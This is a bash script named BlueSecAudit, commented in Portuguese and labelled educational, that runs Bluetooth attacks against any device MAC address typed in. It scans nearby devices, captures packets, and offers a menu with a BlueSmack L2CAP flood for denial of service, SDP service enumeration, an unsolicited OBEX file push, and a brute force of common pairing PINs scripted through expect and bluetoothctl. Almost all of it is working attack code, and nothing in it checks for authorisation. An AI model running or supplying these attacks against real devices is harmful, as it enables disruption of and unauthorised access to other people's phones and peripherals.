#!/bin/bash
# Script: BlueSecAudit
# Descrição: Ferramenta educacional para testes de segurança em dispositivos Bluetooth
# Autor: [Seu Nome]
# Versão: 1.0
# Licença: MIT

# Configurações
LOG_FILE="bluetooth_audit.log"
TARGET_FILE="targets.txt"
ATTACK_DIR="attack_results"
HCIDUMP_PID=""

# Cores
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

# Verificar dependências
check_dependencies() {
    declare -a tools=("hcitool" "hciconfig" "l2ping" "sdptool" "bluetoothctl" "hcidump" "obexftp" "expect")
    missing=()
    for tool in "${tools[@]}"; do
        if ! command -v $tool &> /dev/null; then
            missing+=("$tool")
        fi
    done
    
    if [ ${#missing[@]} -gt 0 ]; then
        echo -e "${RED}[ERRO] Ferramentas faltando:${NC} ${missing[*]}"
        echo -e "Instale com: sudo apt-get install bluez bluez-utils bluez-hcidump obexftp expect"
        exit 1
    fi
}

# Iniciar captura de pacotes
start_capture() {
    echo -e "${YELLOW}[*] Iniciando captura de pacotes...${NC}"
    hcidump -w $ATTACK_DIR/bluetooth_capture.pcap &
    HCIDUMP_PID=$!
    sleep 2
}

# Parar captura de pacotes
stop_capture() {
    if [ -n "$HCIDUMP_PID" ]; then
        echo -e "${YELLOW}[*] Parando captura de pacotes (PID: $HCIDUMP_PID)...${NC}"
        kill -INT $HCIDUMP_PID
    fi
}

# Escanear dispositivos
scan_devices() {
    echo -e "${YELLOW}[*] Escaneando dispositivos Bluetooth próximos...${NC}"
    hciconfig hci0 up
    hcitool scan > $TARGET_FILE
    echo -e "${GREEN}[+] Dispositivos encontrados:${NC}"
    cat $TARGET_FILE
    echo ""
}

# Menu de ataques
show_menu() {
    clear
    echo -e "${YELLOW}==== BlueSecAudit - Menu Principal ====${NC}"
    echo "1. BlueSmack Attack (DoS L2CAP)"
    echo "2. SDP Information Leak"
    echo "3. OBEX File Transfer Test"
    echo "4. Bluetooth Brute Force (PIN)"
    echo "5. Full Audit (Todos os testes)"
    echo "6. Sair"
    echo -n "Selecione uma opção: "
}

# BlueSmack Attack (DoS)
bluesmack() {
    read -p "Endereço MAC do alvo: " target
    echo -e "${YELLOW}[*] Executando BlueSmack attack...${NC}"
    l2ping -i hci0 -s 600 -f $target
}

# SDP Information Leak
sdp_leak() {
    read -p "Endereço MAC do alvo: " target
    echo -e "${YELLOW}[*] Coletando informações do SDP...${NC}"
    sdptool browse $target > $ATTACK_DIR/sdp_info_$target.txt
    echo -e "${GREEN}[+] Informações salvas em $ATTACK_DIR/sdp_info_$target.txt${NC}"
}

# OBEX File Transfer Test
obex_test() {
    read -p "Endereço MAC do alvo: " target
    echo -e "${YELLOW}[*] Testando serviço OBEX...${NC}"
    
    # Cria arquivo de teste
    echo "Teste de seguranca OBEX" > $ATTACK_DIR/obex_test.txt
    
    # Tenta enviar arquivo
    obexftp -b $target -B 10 -p $ATTACK_DIR/obex_test.txt
    
    if [ $? -eq 0 ]; then
        echo -e "${RED}[!] OBEX File Transfer bem-sucedido!${NC}"
    else
        echo -e "${GREEN}[+] OBEX File Transfer falhou (pode ser bom)${NC}"
    fi
}

# Bluetooth Brute Force (demonstração)
brute_force() {
    read -p "Endereço MAC do alvo: " target
    echo -e "${YELLOW}[*] Iniciando brute force simulado...${NC}"
    
    # Lista de PINs comuns
    common_pins=("0000" "1111" "1234" "9999" "0001" "1212")
    
    for pin in "${common_pins[@]}"; do
        echo -e "Testando PIN: $pin"
        # Simulação usando expect
        expect -c "
            spawn bluetoothctl
            send \"remove $target\r\"
            send \"pair $target\r\"
            expect \"Enter PIN code:\"
            send \"$pin\r\"
            set timeout 5
            expect {
                \"Failed to pair\" { exit 1 }
                \"Pairing successful\" { exit 0 }
                timeout { exit 2 }
            }
        " > /dev/null 2>&1
        
        case $? in
            0) echo -e "${RED}[!] PIN ENCONTRADO: $pin${NC}"; return;;
            *) continue;;
        esac
    done
    echo -e "${GREEN}[+] Brute force concluído sem sucesso${NC}"
}

# Geração de relatório
generate_report() {
    echo -e "${YELLOW}[*] Gerando relatório final...${NC}"
    echo "==== Relatório de Segurança Bluetooth ====" > $LOG_FILE
    echo "Data: $(date)" >> $LOG_FILE
    echo "-----------------------------------------" >> $LOG_FILE
    
    # Resultados de escaneamento
    echo "Dispositivos Encontrados:" >> $LOG_FILE
    cat $TARGET_FILE >> $LOG_FILE
    echo "" >> $LOG_FILE
    
    # Resultados de ataques
    for result in $ATTACK_DIR/*.txt; do
        echo "Resultados de $(basename $result):" >> $LOG_FILE
        cat $result >> $LOG_FILE
        echo "-----------------------------------------" >> $LOG_FILE
    done
    
    echo -e "${GREEN}[+] Relatório completo salvo em $LOG_FILE${NC}"
}

# Limpeza final
cleanup() {
    stop_capture
    hciconfig hci0 down
    exit 0
}

# Main
mkdir -p $ATTACK_DIR
check_dependencies
scan_devices
start_capture

while true; do
    show_menu
    read choice
    case $choice in
        1) bluesmack;;
        2) sdp_leak;;
        3) obex_test;;
        4) brute_force;;
        5) 
            bluesmack
            sdp_leak
            obex_test
            brute_force
        ;;
        6) break;;
        *) echo -e "${RED}Opção inválida!${NC}";;
    esac
    read -p "Pressione Enter para continuar..."
done

generate_report
cleanup
